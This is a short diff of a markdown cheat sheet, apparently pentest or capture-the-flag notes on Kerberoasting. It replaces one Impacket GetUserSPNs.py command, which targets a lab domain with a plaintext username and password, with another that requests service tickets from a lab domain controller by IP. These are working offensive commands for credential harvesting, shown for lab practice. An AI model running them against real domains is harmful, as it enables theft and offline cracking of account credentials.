@@ -68,7 +68,7 @@ Rubeus:
 Impacket:
 
 ```bash
-python3 impacket GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi!                              
+python3 /opt/wintools/impacket/examples/GetUserSPNs.py vulnnet-rst.local/t-skid -dc-ip 10.10.251.139 -request
 ```
 
 Cracking:
